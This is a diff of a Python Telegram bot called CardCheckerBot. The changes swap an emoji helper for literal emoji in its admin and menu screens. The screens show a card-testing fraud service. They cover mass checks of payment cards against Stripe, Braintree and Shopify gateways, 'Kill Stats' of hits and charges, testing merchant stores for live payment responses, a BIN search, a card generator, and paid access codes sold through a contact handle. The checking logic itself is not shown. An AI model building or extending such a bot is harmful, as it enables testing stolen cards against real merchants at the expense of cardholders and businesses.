+                    "║  🎟️ 𝗥𝗘𝗗𝗘𝗘𝗠 𝗖𝗢𝗗𝗘 🔑                ║\n"
                     "╚══════════════════════════════╝\n\n"
                     "📤 Send: <code>/redeem YOUR_CODE</code>",
                     parse_mode='html',
@@ -2955,23 +2954,23 @@ class CardCheckerBot:
             # ━━━━━━ ADMIN PANEL ━━━━━━
             elif data == "admin":
                 btns = [
-                    [Button.inline(f"📢 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 {E('📡')}", data="admin_broadcast"),
-                     Button.inline(f"{E('👥')} 𝗨𝘀𝗲𝗿𝘀 {E('🧬')}", data="admin_users")],
-                    [Button.inline(f"{E('📊')} 𝗦𝘁𝗮𝘁𝘀 📈", data="admin_stats"),
-                     Button.inline(f"{E('🎟️')} 𝗚𝗲𝗻 𝗖𝗼𝗱𝗲 {E('🔑')}", data="admin_gencode")],
-                    [Button.inline(f"{E('🛒')} 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 {E('☠️')}", data="shopify_admin"),
-                     Button.inline(f"{E('📂')} 𝗦𝗶𝘁𝗲𝘀 {E('🌐')}", data="admin_upload_sites")],
+                    [Button.inline("📢 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 📡", data="admin_broadcast"),
+                     Button.inline("👥 𝗨𝘀𝗲𝗿𝘀 🧬", data="admin_users")],
+                    [Button.inline("📊 𝗦𝘁𝗮𝘁𝘀 📈", data="admin_stats"),
+                     Button.inline("🎟️ 𝗚𝗲𝗻 𝗖𝗼𝗱𝗲 🔑", data="admin_gencode")],
+                    [Button.inline("🛒 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 ☠️", data="shopify_admin"),
+                     Button.inline("📂 𝗦𝗶𝘁𝗲𝘀 🌐", data="admin_upload_sites")],
                     [Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="back_main")]
                 ]
                 await event.edit(
                     "╔══════════════════════════════════════╗\n"
-                    f"║  {E('⚙️')} 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟 {E('👑')}                 ║\n"
+                    "║  ⚙️ 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟 👑                 ║\n"
                     "╠══════════════════════════════════════╣\n\n"
-                    f"┏━━━━━ {E('📊')} Overview ━━━━━━━━━┓\n"
-                    f"┃ {E('👥')} Global Users:  <code>{len(self.users)}</code>\n"
-                    f"┃ {E('🛒')} Shopify Users: <code>{len(self.shopify_users)}</code>\n"
-                    f"┃ {E('🌐')} Sites Alive:   <code>{len(self.working_sites)}</code>\n"
-                    f"┃ {E('🕒')} Uptime:        <code>{self.get_uptime()}</code>\n"
+                    "┏━━━━━ 📊 Overview ━━━━━━━━━┓\n"
+                    f"┃ 👥 Global Users:  <code>{len(self.users)}</code>\n"
+                    f"┃ 🛒 Shopify Users: <code>{len(self.shopify_users)}</code>\n"
+                    f"┃ 🌐 Sites Alive:   <code>{len(self.working_sites)}</code>\n"
+                    f"┃ 🕒 Uptime:        <code>{self.get_uptime()}</code>\n"
                     "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                     buttons=btns, parse_mode='html'
                 )
@@ -2980,16 +2979,16 @@ class CardCheckerBot:
                 self.user_upload_mode[uid] = 'owner_sites'
                 await event.edit(
                     "╔══════════════════════════════════════╗\n"
-                    f"║  {E('📂')} 𝗨𝗣𝗟𝗢𝗔𝗗 𝗦𝗜𝗧𝗘𝗦 {E('⚡')}                ║\n"
+                    "║  📂 𝗨𝗣𝗟𝗢𝗔𝗗 𝗦𝗜𝗧𝗘𝗦 ⚡                ║\n"
                     "╠══════════════════════════════════════╣\n\n"
-                    f"┌──────── {E('📝')} 𝗙𝗼𝗿𝗺𝗮𝘁 ──────────────┐\n"
+                    "┌──────── 📝 𝗙𝗼𝗿𝗺𝗮𝘁 ──────────────┐\n"
                     "│  One URL per line:\n"
                     "│  <code>https://store1.com</code>\n"
                     "│  <code>https://store2.com</code>\n"
                     "└──────────────────────────────────────┘\n\n"
-                    f"{E('⚠️')} <b>Max:</b> <code>{MAX_OWNER_SITES}</code> sites\n\n"
-                    f"{E('⚡')} <b>All sites will be trusted as working</b>\n"
-                    f"{E('💎')} <i>No testing — instant load</i>\n\n"
+                    f"⚠️ <b>Max:</b> <code>{MAX_OWNER_SITES}</code> sites\n\n"
+                    "⚡ <b>All sites will be trusted as working</b>\n"
+                    "💎 <i>No testing — instant load</i>\n\n"
                     "📤 <b>Send your .txt file now...</b>",
                     parse_mode='html',
                     buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸", data="admin")
@@ -2999,25 +2998,25 @@ class CardCheckerBot:
                 good_count = len(self.good_sites)
                 captcha_blocked = len(self._captcha_blocked_sites)
                 btns = [
-                    [Button.inline(f"{E('👥')} 𝗨𝘀𝗲𝗿𝘀 {E('🧬')}", data="shopify_list_users"),
-                     Button.inline(f"{E('🎟️')} 𝗚𝗲𝗻 𝗖𝗼𝗱𝗲 {E('🔑')}", data="shopify_gencode")],
-                    [Button.inline(f"{E('✅')} 𝗔𝗽𝗽𝗿𝗼𝘃𝗲 {E('👤')}", data="shopify_approve_prompt"),
-                     Button.inline(f"{E('❌')} 𝗥𝗲𝘃𝗼𝗸𝗲 🚫", data="shopify_revoke_prompt")],
-                    [Button.inline(f"{E('🔍')} 𝗧𝗲𝘀𝘁 𝗦𝗶𝘁𝗲𝘀 (𝗔𝗣𝗜) {E('⚡')}", data="shopify_test_sites")],
+                    [Button.inline("👥 𝗨𝘀𝗲𝗿𝘀 🧬", data="shopify_list_users"),
+                     Button.inline("🎟️ 𝗚𝗲𝗻 𝗖𝗼𝗱𝗲 🔑", data="shopify_gencode")],
+                    [Button.inline("✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲 👤", data="shopify_approve_prompt"),
+                     Button.inline("❌ 𝗥𝗲𝘃𝗼𝗸𝗲 🚫", data="shopify_revoke_prompt")],
+                    [Button.inline("🔍 𝗧𝗲𝘀𝘁 𝗦𝗶𝘁𝗲𝘀 (𝗔𝗣𝗜) ⚡", data="shopify_test_sites")],
                     [Button.inline(f"✨ Use Only Good Sites ({good_count})", data="shopify_use_good_sites")],
-                    [Button.inline(f"{E('🎟️')} Mass Gen Codes (up to 50)", data="shopify_mass_gencode_menu")],
+                    [Button.inline("🎟️ Mass Gen Codes (up to 50)", data="shopify_mass_gencode_menu")],
                     [Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="admin")]
                 ]
                 await event.edit(
                     "╔══════════════════════════════════════╗\n"
-                    f"║  {E('🛒')} 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗔𝗗𝗠𝗜𝗡 {E('☠️')}              ║\n"
+                    "║  🛒 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗔𝗗𝗠𝗜𝗡 ☠️              ║\n"
                     "╠══════════════════════════════════════╣\n\n"
-                    f"┏━━━━━ {E('📊')} Overview ━━━━━━━━━┓\n"
-                    f"┃ {E('👥')} Users: <code>{len(self.shopify_users)}</code>\n"
-                    f"┃ {E('🟢')} Sites: <code>{len(self.working_sites)}</code> alive\n"
+                    "┏━━━━━ 📊 Overview ━━━━━━━━━┓\n"
+                    f"┃ 👥 Users: <code>{len(self.shopify_users)}</code>\n"
+                    f"┃ 🟢 Sites: <code>{len(self.working_sites)}</code> alive\n"
                     f"┃ ✨ Good:  <code>{good_count}</code>\n"
-                    f"┃ {E('🔴')} Dead:  <code>{len(self.dead_sites)}</code>\n"
-                    f"┃ {E('⏳')} CAPTCHA blocked: <code>{captcha_blocked}</code>\n"
+                    f"┃ 🔴 Dead:  <code>{len(self.dead_sites)}</code>\n"
+                    f"┃ ⏳ CAPTCHA blocked: <code>{captcha_blocked}</code>\n"
                     "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                     buttons=btns, parse_mode='html'
                 )
@@ -3025,14 +3024,14 @@ class CardCheckerBot:
             elif data == "shopify_test_sites":
                 # Admin-only: run API site tester and auto-load working sites
                 if uid not in ADMINS:
-                    await event.answer(f"{E('🔒')} Admin only.", alert=True)
+                    await event.answer("🔒 Admin only.", alert=True)
                     return
                 await event.edit(
                     "╔══════════════════════════════════════╗\n"
-                    f"║  {E('🔍')} 𝗧𝗘𝗦𝗧𝗜𝗡𝗚 𝗦𝗜𝗧𝗘𝗦... {E('⏳')}             ║\n"
+                    "║  🔍 𝗧𝗘𝗦𝗧𝗜𝗡𝗚 𝗦𝗜𝗧𝗘𝗦... ⏳             ║\n"
                     "╠══════════════════════════════════════╣\n\n"
                     f"┃ Testing <code>{len(self.owner_sites)}</code> sites via API...\n"
-                    f"┃ {E('⚡')} Concurrent ({SITE_TEST_CONCURRENCY_LIMIT} parallel) + retry on 503.\n"
+                    f"┃ ⚡ Concurrent ({SITE_TEST_CONCURRENCY_LIMIT} parallel) + retry on 503.\n"
                     "┃ This may take a few minutes.\n"
                     "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                     parse_mode='html'
@@ -3049,36 +3048,36 @@ class CardCheckerBot:
                         self.site_index = 0
                         self.dead_sites = set()
                         loaded = len(self.working_sites)
-                        fallback_msg = f"\n{E('⚠️')} <i>No tested sites passed — using ALL owner sites as fallback.</i>"
+                        fallback_msg = "\n⚠️ <i>No tested sites passed — using ALL owner sites as fallback.</i>"
                         logger.warning(f"⚠️ Site test found 0 working — falling back to {loaded} owner_sites")
 
                     # Build working sites preview
                     working_preview = ""
                     if working:
                         sample = working[:5]
-                        working_preview = "\n".join([f"┃ {E('✅')} <code>{self.normalize_site_url(s).replace('https://', '')}</code>" for s in sample])
+                        working_preview = "\n".join([f"┃ ✅ <code>{self.normalize_site_url(s).replace('https://', '')}</code>" for s in sample])
                         if len(working) > 5:
                             working_preview += f"\n┃ ... and {len(working) - 5} more"
                         working_preview = f"\n\n┏━━━ Working sites (sample) ━━━┓\n{working_preview}\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
 
                     await event.edit(
                         "╔══════════════════════════════════════╗\n"
-                        f"║  {E('🔍')} 𝗦𝗜𝗧𝗘 𝗧𝗘𝗦𝗧 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 {E('✅')}         ║\n"
+                        "║  🔍 𝗦𝗜𝗧𝗘 𝗧𝗘𝗦𝗧 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 ✅         ║\n"
                         "╠══════════════════════════════════════╣\n\n"
-                        f"┃ {E('✅')} Working: <code>{len(working)}</code>\n"
+                        f"┃ ✅ Working: <code>{len(working)}</code>\n"
                         f"┃ ✨ Good:    <code>{len(self.good_sites)}</code> (real payment responses)\n"
-                        f"┃ {E('❌')} Dead:    <code>{len(dead)}</code>\n"
-                        f"┃ {E('📦')} Loaded:  <code>{loaded}</code> sites activated\n"
+                        f"┃ ❌ Dead:    <code>{len(dead)}</code>\n"
+                        f"┃ 📦 Loaded:  <code>{loaded}</code> sites activated\n"
                         "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                         f"{working_preview}\n\n"
-                        f"{E('💎')} <i>Only fully verified sites loaded for mass checks.</i>{fallback_msg}\n"
-                        f"{E('📋')} <i>Check bot logs for per-site failure details.</i>",
+                        f"💎 <i>Only fully verified sites loaded for mass checks.</i>{fallback_msg}\n"
+                        "📋 <i>Check bot logs for per-site failure details.</i>",
                         parse_mode='html',
                         buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
                     )
                 except Exception as e:
                     await event.edit(
-                        f"{E('❌')} Site test failed: <code>{str(e)[:100]}</code>",
+                        f"❌ Site test failed: <code>{str(e)[:100]}</code>",
                         parse_mode='html',
                         buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
                     )
@@ -3087,19 +3086,19 @@ class CardCheckerBot:
                 # No testing — just show current site status
                 w = len(self.working_sites)
                 d = len(self.dead_sites)
-                wl = "\n".join([f"┃ {E('✅')} <code>{s}</code>" for s in self.working_sites[:8]]) or "┃ <i>None</i>"
-                dl = "\n".join([f"┃ {E('❌')} <code>{s}</code>" for s in list(self.dead_sites)[:5]]) or "┃ <i>None</i>"
+                wl = "\n".join([f"┃ ✅ <code>{s}</code>" for s in self.working_sites[:8]]) or "┃ <i>None</i>"
+                dl = "\n".join([f"┃ ❌ <code>{s}</code>" for s in list(self.dead_sites)[:5]]) or "┃ <i>None</i>"
                 await event.edit(
                     "╔══════════════════════════════════════╗\n"
-                    f"║  🏥 𝗦𝗜𝗧𝗘 𝗦𝗧𝗔𝗧𝗨𝗦 {E('⚡')}                 ║\n"
+                    "║  🏥 𝗦𝗜𝗧𝗘 𝗦𝗧𝗔𝗧𝗨𝗦 ⚡                 ║\n"
                     "╠══════════════════════════════════════╣\n\n"
-                    f"┏━━━━━ {E('✅')} Working ({w}) ━━━━━━┓\n"
+                    f"┏━━━━━ ✅ Working ({w}) ━━━━━━┓\n"
                     f"{wl}\n"
                     "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
-                    f"┏━━━━━ {E('❌')} Dead ({d}) ━━━━━━━━━┓\n"
+                    f"┏━━━━━ ❌ Dead ({d}) ━━━━━━━━━┓\n"
                     f"{dl}\n"
                     "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
-                    f"{E('💎')} <i>Sites are trusted — no testing needed</i>",
+                    "💎 <i>Sites are trusted — no testing needed</i>",
                     parse_mode='html',
                     buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
                 )
@@ -3107,7 +3106,7 @@ class CardCheckerBot:
             # ━━━━━━ USE ONLY GOOD SITES ━━━━━━
             elif data == "shopify_use_good_sites":
                 if uid not in ADMINS:
-                    await event.answer(f"{E('🔒')} Admin only.", alert=True)
+                    await event.answer("🔒 Admin only.", alert=True)
                     return
                 # Load good_sites_api.txt if it exists
                 good_loaded = 0
@@ -3121,17 +3120,17 @@ class CardCheckerBot:
                         good_loaded = len(good)
                 if good_loaded == 0:
                     await event.edit(
-                        f"{E('❌')} No good sites found. Run <b>Test Sites</b> first.",
+                        "❌ No good sites found. Run <b>Test Sites</b> first.",
                         parse_mode='html',
                         buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
                     )
                 else:
                     await event.edit(
                         "╔══════════════════════════════════════╗\n"
-                        f"║  ✨ 𝗚𝗢𝗢𝗗 𝗦𝗜𝗧𝗘𝗦 𝗟𝗢𝗔𝗗𝗘𝗗 {E('✅')}           ║\n"
+                        "║  ✨ 𝗚𝗢𝗢𝗗 𝗦𝗜𝗧𝗘𝗦 𝗟𝗢𝗔𝗗𝗘𝗗 ✅           ║\n"
                         "╠══════════════════════════════════════╣\n\n"
-                        f"┃ {E('✅')} Loaded: <code>{good_loaded}</code> good sites\n"
-                        f"┃ {E('💎')} Only sites with real payment responses\n"
+                        f"┃ ✅ Loaded: <code>{good_loaded}</code> good sites\n"
+                        "┃ 💎 Only sites with real payment responses\n"
                         "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                         parse_mode='html',
                         buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
@@ -3140,11 +3139,11 @@ class CardCheckerBot:
             # ━━━━━━ MASS GEN CODES MENU (Button-driven) ━━━━━━
             elif data == "shopify_mass_gencode_menu":
                 if uid not in ADMINS:
-                    await event.answer(f"{E('🔒')} Admin only.", alert=True)
+                    await event.answer("🔒 Admin only.", alert=True)
                     return
                 await event.edit(
                     "╔══════════════════════════════════════╗\n"
-                    f"║  {E('🎟️')} 𝗠𝗔𝗦𝗦 𝗚𝗘𝗡 𝗖𝗢𝗗𝗘𝗦                 ║\n"
+                    "║  🎟️ 𝗠𝗔𝗦𝗦 𝗚𝗘𝗡 𝗖𝗢𝗗𝗘𝗦                 ║\n"
                     "╠══════════════════════════════════════╣\n\n"
                     "┃ Select how many codes to generate:\n"
                     "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
@@ -3153,20 +3152,20 @@ class CardCheckerBot:
                         [Button.inline("🔟 10 codes", data="mgc_count_10"),
                          Button.inline("2️⃣5️⃣ 25 codes", data="mgc_count_25")],
                         [Button.inline("5️⃣0️⃣ 50 codes", data="mgc_count_50")],
-                        [Button.inline(f"{E('❌')} Cancel", data="shopify_admin")]
+                        [Button.inline("❌ Cancel", data="shopify_admin")]
                     ]
                 )
 
             elif data.startswith("mgc_count_"):
                 if uid not in ADMINS:
-                    await event.answer(f"{E('🔒')} Admin only.", alert=True)
+                    await event.answer("🔒 Admin only.", alert=True)
                     return
                 count = int(data.replace("mgc_count_", ""))
                 self._mgc_pending = getattr(self, '_mgc_pending', {})
                 self._mgc_pending[uid] = count
                 await event.edit(
                     "╔══════════════════════════════════════╗\n"
-                    f"║  {E('🎟️')} 𝗠𝗔𝗦𝗦 𝗚𝗘𝗡 𝗖𝗢𝗗𝗘𝗦                 ║\n"
+                    "║  🎟️ 𝗠𝗔𝗦𝗦 𝗚𝗘𝗡 𝗖𝗢𝗗𝗘𝗦                 ║\n"
                     "╠══════════════════════════════════════╣\n\n"
                     f"┃ Generating <b>{count}</b> codes.\n"
                     "┃ Select duration:\n"
@@ -3179,13 +3178,13 @@ class CardCheckerBot:
                         [Button.inline("1w", data="mgc_dur_1w"),
                          Button.inline("1month", data="mgc_dur_1month"),
                          Button.inline("perm", data="mgc_dur_perm")],
-                        [Button.inline(f"{E('❌')} Cancel", data="shopify_admin")]
+                        [Button.inline("❌ Cancel", data="shopify_admin")]
                     ]
                 )
 
             elif data.startswith("mgc_dur_"):
                 if uid not in ADMINS:
-                    await event.answer(f"{E('🔒')} Admin only.", alert=True)
+                    await event.answer("🔒 Admin only.", alert=True)
                     return
                 duration = data.replace("mgc_dur_", "")
                 self._mgc_pending = getattr(self, '_mgc_pending', {})
@@ -3197,7 +3196,7 @@ class CardCheckerBot:
                         codes.append(code)
                 if not codes:
                     await event.edit(
-                        f"{E('❌')} Failed to generate codes.",
+                        "❌ Failed to generate codes.",
                         parse_mode='html',
                         buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
                     )
@@ -3205,12 +3204,12 @@ class CardCheckerBot:
                 codes_text = "\n".join(f"<code>{c}</code>" for c in codes)
                 msg_text = (
                     "╔══════════════════════════════════╗\n"
-                    f"║  {E('🎟️')} MASS CODES GENERATED         ║\n"
+                    "║  🎟️ MASS CODES GENERATED         ║\n"
                     "╚══════════════════════════════════╝\n\n"
-                    f"{E('📊')} Count: <b>{len(codes)}</b>\n"
-                    f"{E('⏳')} Duration: <b>{duration}</b>\n"
+                    f"📊 Count: <b>{len(codes)}</b>\n"
+                    f"⏳ Duration: <b>{duration}</b>\n"
                     f"🔰 Type: <b>Shopify Access</b>\n\n"
-                    f"{E('🔑')} Codes:\n{codes_text}\n\n"
+                    f"🔑 Codes:\n{codes_text}\n\n"
                     f"💡 Users redeem with: <code>/redeem CODE</code>"
                 )
                 if len(msg_text) > 4000:
@@ -3222,7 +3221,7 @@ class CardCheckerBot:
                         for c in codes:
                             f.write(f"{c}\n")
                     await event.edit(
-                        f"{E('🎟️')} Generated {len(codes)} Shopify codes ({duration}).",
+                        f"🎟️ Generated {len(codes)} Shopify codes ({duration}).",
                         parse_mode='html',
                         buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
                     )
@@ -3241,7 +3240,7 @@ class CardCheckerBot:
                 if not self.shopify_users:
                     await event.edit(
                         "╔══════════════════════════════╗\n"
-                        f"║   {E('👥')} SHOPIFY USERS           ║\n"
+                        "║   👥 SHOPIFY USERS           ║\n"
                         "╚══════════════════════════════╝\n\n"
                         "<i>No users found</i>",
                         parse_mode='html',
@@ -3254,7 +3253,7 @@ class CardCheckerBot:
                     ]
                     await event.edit(
                         "╔══════════════════════════════╗\n"
-                        f"║   {E('👥')} SHOPIFY USERS           ║\n"
+                        "║   👥 SHOPIFY USERS           ║\n"
                         "╚══════════════════════════════╝\n\n"
                         f"┏━━━ Total: <code>{len(self.shopify_users)}</code> ━━━━━━━━━┓\n"
                         f"{chr(10).join(lines)}\n"
@@ -3266,7 +3265,7 @@ class CardCheckerBot:
             elif data == "shopify_gencode":
                 await event.edit(
                     "╔══════════════════════════════╗\n"
-                    f"║   {E('🎟️')} GEN SHOPIFY CODE        ║\n"
+                    "║   🎟️ GEN SHOPIFY CODE        ║\n"
                     "╚══════════════════════════════╝\n\n"
                     "📤 <code>/shopify_gencode &lt;duration&gt;</code>\n\n"
                     "⏱ <code>30m</code> <code>1h</code> <code>1d</code> <code>1w</code> <code>1month</code> <code>perm</code>",
@@ -3277,7 +3276,7 @@ class CardCheckerBot:
             elif data == "shopify_approve_prompt":
                 await event.edit(
                     "╔══════════════════════════════╗\n"
-                    f"║   {E('✅')} APPROVE SHOPIFY         ║\n"
+                    "║   ✅ APPROVE SHOPIFY         ║\n"
                     "╚══════════════════════════════╝\n\n"
                     "📤 <code>/shopify_approve &lt;uid&gt; &lt;dur&gt;</code>",
                     parse_mode='html',
@@ -3287,7 +3286,7 @@ class CardCheckerBot:
             elif data == "shopify_revoke_prompt":
                 await event.edit(
                     "╔══════════════════════════════╗\n"
-                    f"║   {E('❌')} REVOKE SHOPIFY          ║\n"
+                    "║   ❌ REVOKE SHOPIFY          ║\n"
                     "╚══════════════════════════════╝\n\n"
                     "📤 <code>/shopify_revoke &lt;uid&gt;</code>",
                     parse_mode='html',
@@ -3308,7 +3307,7 @@ class CardCheckerBot:
                 if not self.users:
                     await event.edit(
                         "╔══════════════════════════════╗\n"
-                        f"║   {E('👥')} GLOBAL USERS            ║\n"
+                        "║   👥 GLOBAL USERS            ║\n"
                         "╚══════════════════════════════╝\n\n"
                         "<i>No users found</i>",
                         parse_mode='html',
@@ -3321,7 +3320,7 @@ class CardCheckerBot:
                     ]
                     await event.edit(
                         "╔══════════════════════════════╗\n"
-                        f"║   {E('👥')} GLOBAL USERS            ║\n"
+                        "║   👥 GLOBAL USERS            ║\n"
                         "╚══════════════════════════════╝\n\n"
                         f"┏━━━ Total: <code>{len(self.users)}</code> ━━━━━━━━━━┓\n"
                         f"{chr(10).join(lines)}\n"
@@ -3337,14 +3336,14 @@ class CardCheckerBot:
                 r = (ta / tc * 100) if tc else 0
                 await event.edit(
                     "╔══════════════════════════════╗\n"
-                    f"║   {E('📊')} BOT STATISTICS          ║\n"
+                    "║   📊 BOT STATISTICS          ║\n"
                     "╚══════════════════════════════╝\n\n"
                     "┏━━━━━ 📈 Data ━━━━━━━━━━━━━┓\n"
-                    f"┃ {E('🔍')} Checked:  <code>{tc:,}</code>\n"
-                    f"┃ {E('✅')} Approved: <code>{ta:,}</code>\n"
-                    f"┃ {E('💰')} Charged:  <code>{tch:,}</code>\n"
+                    f"┃ 🔍 Checked:  <code>{tc:,}</code>\n"
+                    f"┃ ✅ Approved: <code>{ta:,}</code>\n"
+                    f"┃ 💰 Charged:  <code>{tch:,}</code>\n"
                     f"┃ 📈 Rate:     <code>{r:.1f}%</code>\n"
-                    f"┃ {E('🕒')} Uptime:   <code>{self.get_uptime()}</code>\n"
+                    f"┃ 🕒 Uptime:   <code>{self.get_uptime()}</code>\n"
                     "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                     parse_mode='html', buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="admin")
                 )
@@ -3352,7 +3351,7 @@ class CardCheckerBot:
             elif data == "admin_gencode":
                 await event.edit(
                     "╔══════════════════════════════╗\n"
-                    f"║   {E('🎟️')} GEN GLOBAL CODE         ║\n"
+                    "║   🎟️ GEN GLOBAL CODE         ║\n"
                     "╚══════════════════════════════╝\n\n"
                     "📤 <code>/gencode &lt;duration&gt;</code>\n\n"
                     "⏱ <code>30m</code> <code>1h</code> <code>1d</code> <code>1w</code> <code>1month</code> <code>perm</code>",
@@ -3362,13 +3361,13 @@ class CardCheckerBot:
 
             elif data == "back_main":
                 if not self.has_any_access(uid):
-                    btns = [[Button.inline(f"{E('🎟️')} 𝗥𝗲𝗱𝗲𝗲𝗺 𝗖𝗼𝗱𝗲 {E('🔑')}", data="redeem_menu")]]
+                    btns = [[Button.inline("🎟️ 𝗥𝗲𝗱𝗲𝗲𝗺 𝗖𝗼𝗱𝗲 🔑", data="redeem_menu")]]
                     await event.edit(
                         "╔══════════════════════════════╗\n"
-                        f"║     {E('🔒')} ACCESS REQUIRED       ║\n"
+                        "║     🔒 ACCESS REQUIRED       ║\n"
                         "╚══════════════════════════════╝\n\n"
                         "📩 Contact @Unknownentit7\n"
-                        f"{E('🎟️')} Or redeem a code below",
+                        "🎟️ Or redeem a code below",
                         buttons=btns, parse_mode='html'
                     )
                     return
@@ -3379,44 +3378,44 @@ class CardCheckerBot:
                 speed_str = f"{speed:.1f}" if speed < 10 else f"{int(speed)}"
                 header = (
                     "╔══════════════════════════════════════╗\n"
-                    f"║  {E('👑')} 𝗦𝗔𝗩𝗔𝗚𝗘  𝗧𝗘𝗥𝗠𝗜𝗡𝗔𝗟 {E('🔥')}            ║\n"
+                    "║  👑 𝗦𝗔𝗩𝗔𝗚𝗘  𝗧𝗘𝗥𝗠𝗜𝗡𝗔𝗟 🔥            ║\n"
                     "╠══════════════════════════════════════╣\n\n"
                     "┏━━━━━ 🖥 System ━━━━━━━━━━┓\n"
-                    f"┃ {E('🟢')} Status:  <code>ONLINE 🔥</code>\n"
+                    "┃ 🟢 Status:  <code>ONLINE 🔥</code>\n"
                     f"┃ 🧠 Engine:  <code>ACTIVE ⚡</code>\n"
                     f"┃ 💨 Speed:   <code>{speed_str} cards/sec</code>\n"
-                    f"┃ {E('🕒')} Uptime:  <code>{self.get_uptime()}</code>\n"
+                    f"┃ 🕒 Uptime:  <code>{self.get_uptime()}</code>\n"
                     "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
-                    f"┏━━━━━ {E('📊')} Kill Stats ━━━━━━━┓\n"
-                    f"┃ {E('🔍')} Checked:  <code>{tc:,}</code>\n"
-                    f"┃ {E('💀')} Hits:     <code>{ta:,}</code>\n"
+                    "┏━━━━━ 📊 Kill Stats ━━━━━━━┓\n"
+                    f"┃ 🔍 Checked:  <code>{tc:,}</code>\n"
+                    f"┃ 💀 Hits:     <code>{ta:,}</code>\n"
                     f"┃ 📈 Rate:     <code>{sr:.1f}%</code>\n"
                     "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
-                    f"┏━━━━━ {E('📃')} Limits ━━━━━━━━━━┓\n"
-                    f"┃ {E('⚡')} Stripe:    <code>{MAX_CARDS_PER_FILE_STRIPE:,}</code>\n"
-                    f"┃ {E('🌐')} Braintree: <code>{MAX_CARDS_PER_FILE_BRAINTREE:,}</code>\n"
-                    f"┃ {E('🛒')} Shopify:   <code>{MAX_CARDS_PER_FILE_SHOPIFY:,}</code>\n"
+                    "┏━━━━━ 📃 Limits ━━━━━━━━━━┓\n"
+                    f"┃ ⚡ Stripe:    <code>{MAX_CARDS_PER_FILE_STRIPE:,}</code>\n"
+                    f"┃ 🌐 Braintree: <code>{MAX_CARDS_PER_FILE_BRAINTREE:,}</code>\n"
+                    f"┃ 🛒 Shopify:   <code>{MAX_CARDS_PER_FILE_SHOPIFY:,}</code>\n"
                     "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
-                    f"👇 <b>ᴘɪᴄᴋ ʏᴏᴜʀ ᴡᴇᴀᴘᴏɴ {E('💀')}</b>"
+                    "👇 <b>ᴘɪᴄᴋ ʏᴏᴜʀ ᴡᴇᴀᴘᴏɴ 💀</b>"
                 )
                 btns = []
                 if self.is_user_approved(uid):
                     btns.extend([
-                        [Button.inline(f"{E('⚡')} 𝗦𝘁𝗿𝗶𝗽𝗲 {E('🗡️')}", data="mode_single"),
-                         Button.inline(f"{E('🌐')} 𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 💉", data="mode_bt_single")],
-                        [Button.inline(f"{E('📃')} 𝗦𝘁𝗿𝗶𝗽𝗲 𝗠𝗮𝘀𝘀 {E('🔥')}", data="mode_mass"),
-                         Button.inline(f"{E('📃')} 𝗕𝗧 𝗠𝗮𝘀𝘀 {E('💣')}", data="mode_bt_mass")],
+                        [Button.inline("⚡ 𝗦𝘁𝗿𝗶𝗽𝗲 🗡️", data="mode_single"),
+                         Button.inline("🌐 𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 💉", data="mode_bt_single")],
+                        [Button.inline("📃 𝗦𝘁𝗿𝗶𝗽𝗲 𝗠𝗮𝘀𝘀 🔥", data="mode_mass"),
+                         Button.inline("📃 𝗕𝗧 𝗠𝗮𝘀𝘀 💣", data="mode_bt_mass")],
                     ])
                 if self.is_shopify_approved(uid):
-                    btns.append([Button.inline(f"{E('🛒')} 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 {E('☠️')}", data="shopify_menu")])
+                    btns.append([Button.inline("🛒 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ☠️", data="shopify_menu")])
                 btns.extend([
-                    [Button.inline(f"{E('👤')} 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 {E('💎')}", data="account"),
-                     Button.inline(f"{E('ℹ️')} 𝗛𝗲𝗹𝗽 📖", data="help_menu")],
-                    [Button.inline(f"{E('🔍')} 𝗕𝗜𝗡 {E('🧬')}", data="bin_search"),
-                     Button.inline(f"{E('🎴')} 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗼𝗿 🎲", data="card_gen")],
